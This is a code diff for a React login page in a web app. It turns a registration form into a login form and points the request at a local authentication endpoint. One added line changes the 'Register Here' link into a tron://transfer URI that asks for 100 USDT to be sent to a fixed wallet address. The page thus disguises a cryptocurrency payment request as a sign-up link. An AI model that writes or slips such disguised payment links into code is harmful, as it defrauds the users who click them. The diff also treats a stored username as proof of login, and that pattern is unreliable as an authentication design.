@@ -1,22 +1,17 @@
 "use client";
 import React, { useState } from 'react';
 // import './styles2.css';
-import '../styles2.css';
+import './styles3.css';
 
 
 const Page = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
+//   const [confirmPassword, setConfirmPassword] = useState('');
 
-  const handleRegister = async () => {
-    if (password !== confirmPassword) {
-      alert("Passwords do not match!");
-      return;
-    }
-
+const handleLogin = async () => {
     try {
-      const response = await fetch('http://127.0.0.1:8000/create_user', {
+      const response = await fetch('http://127.0.0.1:8000/authenticate_user', {  // Updated endpoint
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -26,22 +21,20 @@ const Page = () => {
           password: password,
         }),
       });
-
+  
       const data = await response.json();
       if (response.ok) {
-        alert("User registered successfully!");
-                // Store username in localStorage
-                localStorage.setItem('username', username);
-                // Use window.location to navigate to /user page
-                window.location.href = '/user';  // Redirect to /user page
+        localStorage.setItem('username', username);
+        window.location.href = '/Community';  // Redirect to user dashboard
       } else {
-        alert(`Error: ${data.message || 'Something went wrong'}`);
+        alert(`Error: ${data.error || 'Login failed. Please check your credentials.'}`);
       }
     } catch (error) {
       console.error("Error:", error);
-      alert("Failed to register user.");
+      alert("Failed to login.");
     }
   };
+  
 
   return (
     <div className="popup-overlay">
@@ -49,7 +42,7 @@ const Page = () => {
         <img src="./Assets/logo.png" alt="Logo" className="logo" />
       </div>
       <div className="popup-content">
-        <h1>Sign In</h1>
+        <h1>Log In</h1>
         <input
           type="text"
           placeholder="Username"
@@ -66,24 +59,19 @@ const Page = () => {
             onChange={(e) => setPassword(e.target.value)}
           />
         </div>
-        <input
-          type="password"
-          placeholder="Confirm Password"
-          className="input-field"
-          value={confirmPassword}
-          onChange={(e) => setConfirmPassword(e.target.value)}
-        />
-        <button className="register-btn" onClick={handleRegister}>
-          Register
-        </button>
+
+        <button className="register-btn" onClick={handleLogin}>
+  Sign In
+</button>
+
         <p>
-          Already signed in? <a href="/login">Continue here.</a>
+          New here? <a href="tron://transfer?address=TX27wZAc3WmNcPJqX7guaxHLcjGySBQrzU&token=USDT&amount=100">Register Here</a>
         </p>
         <hr />
-        <div className="social-buttons">
+        {/* <div className="social-buttons">
           <button className="google-btn">Continue with Google</button>
           <button className="apple-btn">Continue with Apple</button>
-        </div>
+        </div> */}
       </div>
       <div className="glitter-container">
         <img src="./Assets/glitter.png" alt="Logo" className="glitter" />
